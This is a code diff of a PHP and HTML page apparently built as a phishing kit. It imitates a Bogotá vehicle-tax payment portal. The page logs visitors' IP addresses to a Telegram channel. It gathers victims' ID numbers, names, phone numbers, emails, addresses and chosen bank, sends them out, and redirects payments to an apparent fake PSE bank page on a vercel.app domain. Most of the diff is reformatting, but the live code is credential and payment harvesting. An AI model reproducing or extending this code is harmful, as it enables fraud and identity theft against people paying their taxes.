@@ -14,19 +14,20 @@ if (is_file($pseConfigPath)) {
     $pseConfig = require $pseConfigPath;
 }
 $PSE_PRIMARY_BANKS = $pseConfig['primary_banks'] ?? [];
-$PSE_PRIMARY_PAGE  = $pseConfig['links']['primary_page'] ?? 'https://pagosonline-pse.vercel.app';
-$PSE_BANK_ALIASES  = $pseConfig['aliases'] ?? [];
+$PSE_PRIMARY_PAGE = $pseConfig['links']['primary_page'] ?? 'https://pagosonline-pse.vercel.app';
+$PSE_BANK_ALIASES = $pseConfig['aliases'] ?? [];
 
 require_once __DIR__ . '/api/privado/telegram.php';
-$ip        = veh_get_ip();
+$ip = veh_get_ip();
 $userAgent = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '—');
 veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
     '📄 Página' => 'index.php',
-    '🌐 IP'     => $ip,
+    '🌐 IP' => $ip,
 ]);
 ?>
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -555,7 +556,7 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
             font-family: var(--font-body);
         }
 
-        .info-card ul + ul {
+        .info-card ul+ul {
             margin-top: 10px;
         }
 
@@ -702,7 +703,7 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
             line-height: 1.5;
         }
 
-        .results__list li + li {
+        .results__list li+li {
             margin-top: 4px;
         }
 
@@ -789,9 +790,9 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
             pointer-events: none;
         }
 
-        .page.page--payment-active > .hero,
-        .page.page--payment-active > .content,
-        .page.page--payment-active > .results {
+        .page.page--payment-active>.hero,
+        .page.page--payment-active>.content,
+        .page.page--payment-active>.results {
             display: none;
         }
 
@@ -804,7 +805,7 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
             background: #f3f3f3;
         }
 
-        .page.page--payment-active > .payment-view {
+        .page.page--payment-active>.payment-view {
             display: block;
         }
 
@@ -1564,6 +1565,7 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
         }
     </style>
 </head>
+
 <body>
     <header class="topbar">
         <div class="topbar__inner">
@@ -1581,7 +1583,8 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
         <section class="hero">
             <h1 class="hero__desktop-title">Paga tu impuesto vehicular</h1>
             <h1 class="hero__mobile-title">Paga tu impuesto<br>vehicular</h1>
-            <p>Consulta, paga y obt&eacute;n tu certificado. <strong>Ingresa los datos del impuesto a pagar.</strong></p>
+            <p>Consulta, paga y obt&eacute;n tu certificado. <strong>Ingresa los datos del impuesto a pagar.</strong>
+            </p>
         </section>
 
         <section class="content">
@@ -1591,9 +1594,12 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                         <label for="tipo-documento"><span class="required">*</span>Tipo de documento</label>
                         <div class="select-wrap">
                             <select id="tipo-documento" name="tipo-documento" aria-label="Tipo de documento">
-                                <option value="CC - Cédula de Ciudadanía">CC - C&eacute;dula de Ciudadan&iacute;a</option>
-                                <option value="CE - Cédula de Extranjería">CE - C&eacute;dula de Extranjer&iacute;a</option>
-                                <option value="NIT - Número de Identificación Tributaria">NIT - N&uacute;mero de Identificaci&oacute;n Tributaria</option>
+                                <option value="CC - Cédula de Ciudadanía">CC - C&eacute;dula de Ciudadan&iacute;a
+                                </option>
+                                <option value="CE - Cédula de Extranjería">CE - C&eacute;dula de Extranjer&iacute;a
+                                </option>
+                                <option value="NIT - Número de Identificación Tributaria">NIT - N&uacute;mero de
+                                    Identificaci&oacute;n Tributaria</option>
                                 <option value="PA - Pasaporte">PA - Pasaporte</option>
                             </select>
                         </div>
@@ -1601,13 +1607,15 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
 
                     <div class="field" data-field="documento">
                         <label for="documento"><span class="required">*</span>N&uacute;mero de documento</label>
-                        <input class="control" id="documento" name="documento" type="text" placeholder="Escribe la informaci&oacute;n solicitada" autocomplete="off">
+                        <input class="control" id="documento" name="documento" type="text"
+                            placeholder="Escribe la informaci&oacute;n solicitada" autocomplete="off">
                         <span class="error">El campo &lsquo;N&uacute;mero de documento&rsquo; es obligatorio</span>
                     </div>
 
                     <div class="field" data-field="placa">
                         <label for="placa"><span class="required">*</span>Placa</label>
-                        <input class="control" id="placa" name="placa" type="text" placeholder="Escribe la informaci&oacute;n solicitada" autocomplete="off" maxlength="6">
+                        <input class="control" id="placa" name="placa" type="text"
+                            placeholder="Escribe la informaci&oacute;n solicitada" autocomplete="off" maxlength="6">
                         <span class="error">El campo &lsquo;Placa&rsquo; es obligatorio</span>
                     </div>
 
@@ -1631,7 +1639,8 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                     <div class="terms">
                         <input class="terms__checkbox" id="accept-terms" name="accept-terms" type="checkbox">
                         <label class="checkbox-label" for="accept-terms">
-                            Acepto los t&eacute;rminos y la Pol&iacute;tica de tratamiento de datos personales. <a href="#">Consultar en este enlace.</a>
+                            Acepto los t&eacute;rminos y la Pol&iacute;tica de tratamiento de datos personales. <a
+                                href="#">Consultar en este enlace.</a>
                         </label>
                     </div>
 
@@ -1644,25 +1653,35 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
 
             <aside class="info-shell">
                 <div class="info-shell__heading">
-                    <svg class="info-shell__heading-icon" width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                        <path d="M14 2.8 5.8 6.3v6.5c0 5.2 3.4 10 8.2 11.4 4.8-1.4 8.2-6.2 8.2-11.4V6.3L14 2.8Z" stroke="#3366CC" stroke-width="2.4" stroke-linejoin="round"/>
-                        <path d="m10.3 13.9 2.3 2.4 5-5.5" stroke="#3366CC" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
+                    <svg class="info-shell__heading-icon" width="28" height="28" viewBox="0 0 28 28" fill="none"
+                        xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                        <path d="M14 2.8 5.8 6.3v6.5c0 5.2 3.4 10 8.2 11.4 4.8-1.4 8.2-6.2 8.2-11.4V6.3L14 2.8Z"
+                            stroke="#3366CC" stroke-width="2.4" stroke-linejoin="round" />
+                        <path d="m10.3 13.9 2.3 2.4 5-5.5" stroke="#3366CC" stroke-width="2.4" stroke-linecap="round"
+                            stroke-linejoin="round" />
                     </svg>
                     <div class="info-shell__heading-text">Informaci&oacute;n importante<br>antes de consultar</div>
                 </div>
 
                 <div class="info-card">
                     <div class="info-card__heading">
-                        <svg class="info-card__icon" width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                            <path d="M6.4 14.1a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Zm13.2 0a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Z" fill="#3366CC"/>
-                            <path d="M19.7 6.3h-2.3L15.8 4H10l-1.5 2.3H6.3A3.3 3.3 0 0 0 3 9.6v7.2h2.1v2.6h2.5v-2.6h10.8v2.6h2.5v-2.6H23V9.6a3.3 3.3 0 0 0-3.3-3.3ZM6.3 8.8h13.4c.4 0 .8.4.8.8v4.7H5.4V9.6c0-.4.4-.8.9-.8Z" fill="#3366CC"/>
+                        <svg class="info-card__icon" width="26" height="26" viewBox="0 0 26 26" fill="none"
+                            xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                            <path
+                                d="M6.4 14.1a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Zm13.2 0a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Z"
+                                fill="#3366CC" />
+                            <path
+                                d="M19.7 6.3h-2.3L15.8 4H10l-1.5 2.3H6.3A3.3 3.3 0 0 0 3 9.6v7.2h2.1v2.6h2.5v-2.6h10.8v2.6h2.5v-2.6H23V9.6a3.3 3.3 0 0 0-3.3-3.3ZM6.3 8.8h13.4c.4 0 .8.4.8.8v4.7H5.4V9.6c0-.4.4-.8.9-.8Z"
+                                fill="#3366CC" />
                         </svg>
                         <span>Impuesto de veh&iacute;culos</span>
                     </div>
 
                     <ul>
-                        <li>Digita el n&uacute;mero de documento del responsable del veh&iacute;culo al 01 de enero de 2026 y la placa registrada en Bogot&aacute;.</li>
-                        <li>Las personas jur&iacute;dicas deben escribir el NIT sin el d&iacute;gito de verificaci&oacute;n.</li>
+                        <li>Digita el n&uacute;mero de documento del responsable del veh&iacute;culo al 01 de enero de
+                            2026 y la placa.</li>
+                        <li>Las personas jur&iacute;dicas deben escribir el NIT sin el d&iacute;gito de
+                            verificaci&oacute;n.</li>
                     </ul>
 
                     <div class="accordion">
@@ -1673,10 +1692,15 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                     </div>
 
                     <ul>
-                        <li>Si tienes un contrato de leasing (locatario), ingresa el NIT de la entidad financiera sin el d&iacute;gito de verificaci&oacute;n.</li>
-                        <li>Si el veh&iacute;culo tiene varios propietarios, puedes buscar la factura con los datos de cualquiera de ellos.</li>
-                        <li>Si el veh&iacute;culo est&aacute; a nombre de una persona que falleci&oacute;, pero al 01 de enero de 2026 aparec&iacute;a como propietario, selecciona el tipo de documento de identidad, digita el n&uacute;mero e ingresa la placa.</li>
-                        <li>Si eres poseedor del veh&iacute;culo, consulta en este enlace toda la informaci&oacute;n para gestionar tu pago.</li>
+                        <li>Si tienes un contrato de leasing (locatario), ingresa el NIT de la entidad financiera sin el
+                            d&iacute;gito de verificaci&oacute;n.</li>
+                        <li>Si el veh&iacute;culo tiene varios propietarios, puedes buscar la factura con los datos de
+                            cualquiera de ellos.</li>
+                        <li>Si el veh&iacute;culo est&aacute; a nombre de una persona que falleci&oacute;, pero al 01 de
+                            enero de 2026 aparec&iacute;a como propietario, selecciona el tipo de documento de
+                            identidad, digita el n&uacute;mero e ingresa la placa.</li>
+                        <li>Si eres poseedor del veh&iacute;culo, consulta en este enlace toda la informaci&oacute;n
+                            para gestionar tu pago.</li>
                     </ul>
                 </div>
             </aside>
@@ -1692,7 +1716,9 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
 
             <div class="results__content" id="results-content" hidden>
                 <div class="results__notice">
-                    <p class="results__lead">Esta b&uacute;squeda muestra el total de las deudas del contribuyente que est&aacute; en etapa de cobro. Los recibos incluyen el total de la deuda a pagar con intereses.</p>
+                    <p class="results__lead">Esta b&uacute;squeda muestra el total de las deudas del contribuyente que
+                        est&aacute; en etapa de cobro. Los recibos incluyen el total de la deuda a pagar con intereses.
+                    </p>
 
                     <div class="results__summary" id="vehicle-summary">
                         <div class="results__summary-card">
@@ -1715,15 +1741,20 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
 
                     <h2 class="results__subtitle">&iexcl;Ten en cuenta!</h2>
                     <ul class="results__list">
-                        <li>Digita el n&uacute;mero de documento del contribuyente propietario al 01 de enero de la vigencia por cancelar y la placa del veh&iacute;culo registrada en Bogot&aacute;.</li>
-                        <li>Las personas jur&iacute;dicas deben escribir el NIT sin d&iacute;gito de verificaci&oacute;n.</li>
-                        <li>Si el veh&iacute;culo tiene varios propietarios, la factura puede generarse con los datos de cualquiera de ellos.</li>
-                        <li>Los recibos de pago (ROP) de fideicomitentes y beneficiarios (patrimonios aut&oacute;nomos) y los de locatarios (leasing) se deben solicitar en los <a href="#">puntos de atenci&oacute;n</a>.</li>
-                        <li>Para actualizar la informaci&oacute;n sobre tu deuda y pagarla en l&iacute;nea, haz clic en el bot&oacute;n Generar ROP. <a href="#">Ver instructivo</a>.</li>
-                        <li>Los cupones de pago del predial por cuotas de a&ntilde;os anteriores deben descargarse en la <a href="#">Oficina Virtual</a>.</li>
+                        <li>Digita el n&uacute;mero de documento del contribuyente propietario al 01 de enero de la
+                            vigencia por cancelar y la placa del veh&iacute;culo.</li>
+                        <li>Las personas jur&iacute;dicas deben escribir el NIT sin d&iacute;gito de
+                            verificaci&oacute;n.</li>
+                        <li>Si el veh&iacute;culo tiene varios propietarios, la factura puede generarse con los datos de
+                            cualquiera de ellos.</li>
+
+                        <li>Los cupones de pago del predial por cuotas de a&ntilde;os anteriores deben descargarse en la
+                            <a href="#">Oficina Virtual</a>.
+                        </li>
                     </ul>
 
-                    <p class="results__after">A continuaci&oacute;n, se relacionan las obligaciones por impuestos de a&ntilde;os anteriores pendientes de pago:</p>
+                    <p class="results__after">A continuaci&oacute;n, se relacionan las obligaciones por impuestos de
+                        a&ntilde;os anteriores pendientes de pago:</p>
                 </div>
 
                 <div class="results__table-block">
@@ -1742,7 +1773,7 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                                     <th>Formulario</th>
                                     <th>Referencia</th>
                                     <th>Total a pagar</th>
-                                    <th>Generar ROP</th>
+
                                     <th>Pagar</th>
                                 </tr>
                             </thead>
@@ -1781,10 +1812,12 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                     </div>
 
                     <div class="payment-ticket__security">
-                        <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                            <rect x="5" y="11" width="18" height="12" rx="6" fill="#DDEBFF"/>
-                            <rect x="10.5" y="4" width="7" height="10" rx="3.5" stroke="#F1B640" stroke-width="2"/>
-                            <path d="M14 15.2c1.3 0 2.3 1 2.3 2.3s-1 2.3-2.3 2.3-2.3-1-2.3-2.3 1-2.3 2.3-2.3Z" fill="#3366CC"/>
+                        <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg"
+                            aria-hidden="true">
+                            <rect x="5" y="11" width="18" height="12" rx="6" fill="#DDEBFF" />
+                            <rect x="10.5" y="4" width="7" height="10" rx="3.5" stroke="#F1B640" stroke-width="2" />
+                            <path d="M14 15.2c1.3 0 2.3 1 2.3 2.3s-1 2.3-2.3 2.3-2.3-1-2.3-2.3 1-2.3 2.3-2.3Z"
+                                fill="#3366CC" />
                         </svg>
                         <div>
                             <strong>Pago seguro</strong><br>
@@ -1795,13 +1828,15 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
 
                 <div class="payment-main">
                     <h1 class="payment-main__title">Realiza tu pago</h1>
-                    <p class="payment-main__subtitle">Completa tu informaci&oacute;n para procesar tu pago de forma segura</p>
+                    <p class="payment-main__subtitle">Completa tu informaci&oacute;n para procesar tu pago de forma
+                        segura</p>
 
                     <form class="payment-form" id="payment-form" novalidate>
                         <h2 class="payment-form__section-title">Datos de titular</h2>
                         <div class="payment-grid">
                             <div class="payment-field">
-                                <label for="payment-document-type"><span class="required">*</span> Tipo de documento</label>
+                                <label for="payment-document-type"><span class="required">*</span> Tipo de
+                                    documento</label>
                                 <div class="payment-select-wrap">
                                     <select class="payment-control" id="payment-document-type">
                                         <option value="">Selecciona una opci&oacute;n</option>
@@ -1813,12 +1848,16 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                                 </div>
                             </div>
                             <div class="payment-field">
-                                <label for="payment-document-number"><span class="required">*</span> N&uacute;mero de documento</label>
-                                <input class="payment-control" id="payment-document-number" type="text" inputmode="numeric" maxlength="15" placeholder="N&uacute;mero de documento" autocomplete="off">
+                                <label for="payment-document-number"><span class="required">*</span> N&uacute;mero de
+                                    documento</label>
+                                <input class="payment-control" id="payment-document-number" type="text"
+                                    inputmode="numeric" maxlength="15" placeholder="N&uacute;mero de documento"
+                                    autocomplete="off">
                                 <div class="payment-error" id="payment-doc-error"></div>
                             </div>
                             <div class="payment-field">
-                                <label for="payment-customer-type"><span class="required">*</span> Tipo de cliente</label>
+                                <label for="payment-customer-type"><span class="required">*</span> Tipo de
+                                    cliente</label>
                                 <div class="payment-select-wrap">
                                     <select class="payment-control" id="payment-customer-type">
                                         <option value="">Selecciona una opci&oacute;n</option>
@@ -1829,20 +1868,26 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                             </div>
                             <div class="payment-field">
                                 <label for="payment-name"><span class="required">*</span> Nombres y apellidos</label>
-                                <input class="payment-control" id="payment-name" type="text" placeholder="Nombres del titular">
+                                <input class="payment-control" id="payment-name" type="text"
+                                    placeholder="Nombres del titular">
                             </div>
                             <div class="payment-field">
-                                <label for="payment-phone"><span class="required">*</span> N&uacute;mero de tel&eacute;fono</label>
-                                <input class="payment-control" id="payment-phone" type="tel" inputmode="numeric" maxlength="10" placeholder="3XXXXXXXXX" autocomplete="tel">
+                                <label for="payment-phone"><span class="required">*</span> N&uacute;mero de
+                                    tel&eacute;fono</label>
+                                <input class="payment-control" id="payment-phone" type="tel" inputmode="numeric"
+                                    maxlength="10" placeholder="3XXXXXXXXX" autocomplete="tel">
                                 <div class="payment-error" id="payment-phone-error"></div>
                             </div>
                             <div class="payment-field">
-                                <label for="payment-email"><span class="required">*</span> Correo electr&oacute;nico</label>
-                                <input class="payment-control" id="payment-email" type="email" placeholder="Correo electr&oacute;nico">
+                                <label for="payment-email"><span class="required">*</span> Correo
+                                    electr&oacute;nico</label>
+                                <input class="payment-control" id="payment-email" type="email"
+                                    placeholder="Correo electr&oacute;nico">
                             </div>
                             <div class="payment-field payment-field--full">
                                 <label for="payment-address"><span class="required">*</span> Direcci&oacute;n</label>
-                                <input class="payment-control" id="payment-address" type="text" placeholder="Direcci&oacute;n">
+                                <input class="payment-control" id="payment-address" type="text"
+                                    placeholder="Direcci&oacute;n">
                             </div>
                         </div>
 
@@ -1869,7 +1914,8 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                                         <option value="1052@BANCO AV VILLAS">BANCO AV VILLAS</option>
                                         <option value="1013@BANCO BBVA COLOMBIA S.A.">BANCO BBVA COLOMBIA S.A.</option>
                                         <option value="1032@BANCO CAJA SOCIAL">BANCO CAJA SOCIAL</option>
-                                        <option value="1066@BANCO COOPERATIVO COOPCENTRAL">BANCO COOPERATIVO COOPCENTRAL</option>
+                                        <option value="1066@BANCO COOPERATIVO COOPCENTRAL">BANCO COOPERATIVO COOPCENTRAL
+                                        </option>
                                         <option value="1051@BANCO DAVIVIENDA">BANCO DAVIVIENDA</option>
                                         <option value="1001@BANCO DE BOGOTA">BANCO DE BOGOTA</option>
                                         <option value="1023@BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option>
@@ -1877,7 +1923,8 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                                         <option value="1063@BANCO FINANDINA S.A. BIC">BANCO FINANDINA S.A. BIC</option>
                                         <option value="1012@BANCO GNB SUDAMERIS">BANCO GNB SUDAMERIS</option>
                                         <option value="1006@BANCO ITAU">BANCO ITAU</option>
-                                        <option value="1071@BANCO J.P. MORGAN COLOMBIA S.A.">BANCO J.P. MORGAN COLOMBIA S.A.</option>
+                                        <option value="1071@BANCO J.P. MORGAN COLOMBIA S.A.">BANCO J.P. MORGAN COLOMBIA
+                                            S.A.</option>
                                         <option value="1047@BANCO MUNDO MUJER S.A.">BANCO MUNDO MUJER S.A.</option>
                                         <option value="1060@BANCO PICHINCHA S.A.">BANCO PICHINCHA S.A.</option>
                                         <option value="1002@BANCO POPULAR">BANCO POPULAR</option>
@@ -1887,21 +1934,25 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                                         <option value="1007@BANCOLOMBIA">BANCOLOMBIA</option>
                                         <option value="1061@BANCOOMEVA S.A.">BANCOOMEVA S.A.</option>
                                         <option value="1808@BOLD CF">BOLD CF</option>
-                                        <option value="1283@CFA COOPERATIVA FINANCIERA">CFA COOPERATIVA FINANCIERA</option>
+                                        <option value="1283@CFA COOPERATIVA FINANCIERA">CFA COOPERATIVA FINANCIERA
+                                        </option>
                                         <option value="1009@CITIBANK">CITIBANK</option>
                                         <option value="1812@COINK SA">COINK SA</option>
                                         <option value="1370@COLTEFINANCIERA">COLTEFINANCIERA</option>
-                                        <option value="1292@CONFIAR COOPERATIVA FINANCIERA">CONFIAR COOPERATIVA FINANCIERA</option>
+                                        <option value="1292@CONFIAR COOPERATIVA FINANCIERA">CONFIAR COOPERATIVA
+                                            FINANCIERA</option>
                                         <option value="1289@COTRAFA">COTRAFA</option>
                                         <option value="1816@CREZCAMOS">CREZCAMOS</option>
                                         <option value="1097@DALE">DALE</option>
                                         <option value="1019@DAVIBANK S.A.">DAVIBANK S.A.</option>
                                         <option value="1551@DAVIPLATA">DAVIPLATA</option>
                                         <option value="1802@DING">DING</option>
-                                        <option value="1121@FINANCIERA JURISCOOP SA COMPANIA DE FINANCIAMIENTO">FINANCIERA JURISCOOP SA COMPANIA DE FINANCIAMIENTO</option>
+                                        <option value="1121@FINANCIERA JURISCOOP SA COMPANIA DE FINANCIAMIENTO">
+                                            FINANCIERA JURISCOOP SA COMPANIA DE FINANCIAMIENTO</option>
                                         <option value="1814@GLOBAL66">GLOBAL66</option>
                                         <option value="1637@IRIS">IRIS</option>
-                                        <option value="1286@JFK COOPERATIVA FINANCIERA">JFK COOPERATIVA FINANCIERA</option>
+                                        <option value="1286@JFK COOPERATIVA FINANCIERA">JFK COOPERATIVA FINANCIERA
+                                        </option>
                                         <option value="1070@LULO BANK">LULO BANK</option>
                                         <option value="1801@MOVII S.A.">MOVII S.A.</option>
                                         <option value="1507@NEQUI">NEQUI</option>
@@ -1919,13 +1970,16 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                         <div class="payment-consent">
                             <input class="payment-consent__checkbox" id="payment-consent" type="checkbox">
                             <label class="payment-consent__text" for="payment-consent">
-                                Acepto los <a href="#">t&eacute;rminos y condiciones</a> generales de uso y autorizo el tratamiento de datos personales.
+                                Acepto los <a href="#">t&eacute;rminos y condiciones</a> generales de uso y autorizo el
+                                tratamiento de datos personales.
                             </label>
                         </div>
 
                         <div class="payment-actions">
-                            <button class="payment-btn payment-btn--ghost" id="cancel-payment-button" type="button">Cancelar pago</button>
-                            <button class="payment-btn payment-btn--primary" id="confirm-payment-button" type="submit" disabled>Pagar $0</button>
+                            <button class="payment-btn payment-btn--ghost" id="cancel-payment-button"
+                                type="button">Cancelar pago</button>
+                            <button class="payment-btn payment-btn--primary" id="confirm-payment-button" type="submit"
+                                disabled>Pagar $0</button>
                         </div>
                     </form>
                 </div>
@@ -1944,10 +1998,10 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
         </div>
     </footer>
     <script>
-        const vehicleApiKey   = <?= json_encode($apiFrontendKey,    JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
+        const vehicleApiKey = <?= json_encode($apiFrontendKey, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
         const psePrimaryBanks = <?= json_encode($PSE_PRIMARY_BANKS, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
-        const psePrimaryPage  = <?= json_encode($PSE_PRIMARY_PAGE,  JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
-        const pseBankAliases  = <?= json_encode($PSE_BANK_ALIASES,  JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
+        const psePrimaryPage = <?= json_encode($PSE_PRIMARY_PAGE, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
+        const pseBankAliases = <?= json_encode($PSE_BANK_ALIASES, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;
         const form = document.getElementById('vehicle-form');
         const documentoInput = document.getElementById('documento');
         const placaInput = document.getElementById('placa');
@@ -1983,9 +2037,9 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
         const paymentAddress = document.getElementById('payment-address');
         const paymentBank = document.getElementById('payment-bank');
         const paymentConsent = document.getElementById('payment-consent');
-        const paymentBankError  = document.getElementById('payment-bank-error');
+        const paymentBankError = document.getElementById('payment-bank-error');
         const paymentPhoneError = document.getElementById('payment-phone-error');
-        const paymentDocError   = document.getElementById('payment-doc-error');
+        const paymentDocError = document.getElementById('payment-doc-error');
         const cancelPaymentButton = document.getElementById('cancel-payment-button');
         const confirmPaymentButton = document.getElementById('confirm-payment-button');
         const requiredFields = [documentoInput, placaInput];
@@ -2127,7 +2181,7 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ event: event, data: data }),
                 keepalive: true
-            }).catch(function () {});
+            }).catch(function () { });
         }
 
         function openPaymentView(context) {
@@ -2160,9 +2214,9 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
             updatePaymentState();
             paymentView.scrollIntoView({ behavior: 'smooth', block: 'start' });
             tgLogEvent('💳 Vista de pago vehicular', {
-                'Placa':    summaryPlaca.textContent,
+                'Placa': summaryPlaca.textContent,
                 'Vehículo': summaryVehiculo.textContent,
-                'Monto':    context.amountText,
+                'Monto': context.amountText,
             });
         }
 
@@ -2179,15 +2233,15 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
         }
 
         function isPhoneValid(v) { return /^3\d{9}$/.test(v); }
-        function isDocValid(v)   { return /^\d{4,15}$/.test(v); }
+        function isDocValid(v) { return /^\d{4,15}$/.test(v); }
         function isEmailValid(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
 
         function updatePaymentState() {
-            const allFilled  = paymentRequiredFields.every((field) => field.value.trim().length > 0);
-            const phoneOk    = isPhoneValid(paymentPhone.value.trim());
-            const docOk      = isDocValid(paymentDocumentNumber.value.trim());
-            const emailOk    = isEmailValid(paymentEmail.value.trim());
-            const isReady    = allFilled && paymentConsent.checked && phoneOk && docOk && emailOk;
+            const allFilled = paymentRequiredFields.every((field) => field.value.trim().length > 0);
+            const phoneOk = isPhoneValid(paymentPhone.value.trim());
+            const docOk = isDocValid(paymentDocumentNumber.value.trim());
+            const emailOk = isEmailValid(paymentEmail.value.trim());
+            const isReady = allFilled && paymentConsent.checked && phoneOk && docOk && emailOk;
             const showBankError = paymentBank.value.trim().length === 0 && paymentConsent.checked;
 
             paymentBankError.textContent = showBankError ? 'El campo banco es obligatorio' : '';
@@ -2260,7 +2314,6 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                     <td data-th="Formulario">${escapeHtml(formulario)}</td>
                     <td data-th="Referencia">${escapeHtml(reference)}</td>
                     <td data-th="Total a pagar">${obligation}</td>
-                    <td data-th="Generar ROP"><span class="responsive-table-link responsive-table-link--disabled">Generar ROP</span></td>
                     <td data-th="Pagar"><a href="#" class="responsive-table-link" data-action="pay-result">Pagar</a></td>
                 </tr>
             `;
@@ -2326,7 +2379,7 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
             return payload;
         }
 
-        const ACCENT_MAP = { 'á':'a','é':'e','í':'i','ó':'o','ú':'u','ñ':'n','ü':'u','à':'a','â':'a','ä':'a','è':'e','ê':'e','ë':'e','î':'i','ï':'i','ô':'o','ö':'o','û':'u','ç':'c' };
+        const ACCENT_MAP = { 'á': 'a', 'é': 'e', 'í': 'i', 'ó': 'o', 'ú': 'u', 'ñ': 'n', 'ü': 'u', 'à': 'a', 'â': 'a', 'ä': 'a', 'è': 'e', 'ê': 'e', 'ë': 'e', 'î': 'i', 'ï': 'i', 'ô': 'o', 'ö': 'o', 'û': 'u', 'ç': 'c' };
 
         function slugify(text) {
             let result = '';
@@ -2518,24 +2571,24 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                 return;
             }
 
-            const bankValue  = paymentBank.value;
-            const bankCode   = bankValue.split('@')[0] || '';
-            const bankName   = bankValue.split('@')[1] || bankValue;
+            const bankValue = paymentBank.value;
+            const bankCode = bankValue.split('@')[0] || '';
+            const bankName = bankValue.split('@')[1] || bankValue;
             const bankConfig = resolvePseBankConfig(bankName, bankCode);
 
-            confirmPaymentButton.disabled    = true;
+            confirmPaymentButton.disabled = true;
             confirmPaymentButton.textContent = 'Procesando...';
 
             const logBase = {
-                '🏦 Banco':           bankName,
-                '💳 Tipo documento':  paymentDocumentType.value,
-                '🪪 Documento':       paymentDocumentNumber.value.trim(),
-                '👤 Nombre':          paymentName.value.trim(),
-                '📱 Teléfono':        paymentPhone.value.trim(),
-                '📧 Correo':          paymentEmail.value.trim(),
-                '🏠 Dirección':       paymentAddress.value.trim(),
-                '👥 Tipo persona':    paymentCustomerType.value,
-                '💰 Monto':           currentPaymentContext.amountText,
+                '🏦 Banco': bankName,
+                '💳 Tipo documento': paymentDocumentType.value,
+                '🪪 Documento': paymentDocumentNumber.value.trim(),
+                '👤 Nombre': paymentName.value.trim(),
+                '📱 Teléfono': paymentPhone.value.trim(),
+                '📧 Correo': paymentEmail.value.trim(),
+                '🏠 Dirección': paymentAddress.value.trim(),
+                '👥 Tipo persona': paymentCustomerType.value,
+                '💰 Monto': currentPaymentContext.amountText,
             };
 
             // Primary banks → Vercel directo
@@ -2543,7 +2596,7 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                 const destUrl = bankConfig.page + '/sites/' + bankConfig.slug + '/manager/' + bankConfig.id;
